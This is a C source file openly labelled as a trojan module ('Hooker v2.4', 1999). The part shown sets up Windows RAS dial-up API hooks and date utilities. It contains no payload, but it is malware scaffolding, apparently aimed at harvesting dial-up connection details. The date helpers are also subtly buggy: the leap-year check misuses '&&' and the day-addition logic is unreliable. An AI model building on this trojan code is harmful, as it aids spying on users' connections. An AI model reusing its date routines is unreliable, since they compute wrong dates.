/********************************************************************/
/*                                                                  */
/*                   Hooker, trojan module v2.x                     */
/*                         ACrazzi, 1999                            */
/*                                                                  */
/********************************************************************/

#include "hooker.h"
#include "ras.h"

const char* Product = "Hooker v2.4";

_StartupInfo sti;   

typedef DWORD (WINAPI *LPRASENUMCCONNECTIONS)(LPRASCONN,LPDWORD,LPDWORD);
typedef DWORD (WINAPI *LPRASGETCONNECTSTATUS)(HRASCONN,LPRASCONNSTATUS);
typedef DWORD (WINAPI *LPRASGETENTRYPROPERTIES)(LPTSTR,LPTSTR,LPRASENTRY,LPDWORD,LPBYTE,LPDWORD);
typedef DWORD (WINAPI *LPRASGETPROJECTIONINFO)(HRASCONN,RASPROJECTION,LPVOID,LPDWORD); 

LPRASENUMCCONNECTIONS RasEnumConnections;
LPRASGETCONNECTSTATUS RasGetConnectStatus;
LPRASGETENTRYPROPERTIES RasGetEntryProperties;
LPRASGETPROJECTIONINFO RasGetProjectionInfo;
bool bRASDLL;

const char* Days[7] = {"Sun","Mon","Tue","Wed","Thu","Fri","Sat"};
const char* Months[12] = {"Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"};

CRITICAL_SECTION gcs;

#ifdef _DEBUG
//-------------------for debugging - shows error-message--------------
void ShowMessage(char* s)
{
	MessageBox(NULL,s,"Error",MB_OK);
};
#endif

//------------------prints system date---------------------------
void SysTimePrint(char* s, SYSTEMTIME& st)
{
	sprintf(
		s,
		"%s, %2.2u %s %u %2.2u:%2.2u:%2.2u",
		Days[st.wDayOfWeek],
		st.wDay,
		Months[st.wMonth-1],
		st.wYear,
		st.wHour,
		st.wMinute,
		st.wSecond
	);
};


//------------------compares two system dates----------------------
//ignoring day of week
//if (d1 > d2)  return  1;
//if (d1 < d2)  return -1;
//if (d1 == d2) return  0;
int SysTimeComp(SYSTEMTIME& d1,SYSTEMTIME& d2) 
{
UINT i;
WORD *p1 = (WORD*)&d1;
WORD *p2 = (WORD*)&d2;
	for (i=0;i<8;i++) {
		if (i == 2) continue;
		if (p1[i] > p2[i]) return 1;
		if (p1[i] < p2[i]) return -1;
	};
	return 0;
};

//-----------------------adds dates------------------------------
//ignoring day of week
//month = 30 days
//year = 365 days
void SysTimeSum(SYSTEMTIME& d, SYSTEMTIME p)
{
UINT i;
	i = d.wMilliseconds + p.wMilliseconds;
	d.wMilliseconds = i%1000;
	i = (d.wSecond + p.wSecond + i/1000);
	d.wSecond = i%60;
	i = d.wMinute + p.wMinute + i/60;
	d.wMinute = i%60;
	i = d.wHour + p.wHour + i/60;
	d.wHour = i%24;
	p.wDay += i/24 + p.wMonth*30 + p.wYear*365 + d.wDay;
	while (p.wDay) {
		//how much days is in current month?
		switch(d.wMonth){
		case 4:
		case 6:
		case 9:
		case 11:
			i = 30;
			break;
		case 2: 
			i = 28 + (!(d.wYear && 3));
			break;
		default:
			i = 31;
			break;
		};
		if (i >= p.wDay) {//all days
			d.wDay = p.wDay;
			p.wDay = 0;
		} else {//Не все
			if (d.wMonth == 12) {//january...
				d.wYear++;
				d.wMonth = 1;
			} else d.wMonth++;
			p.wDay -= i;
		};
	};
};
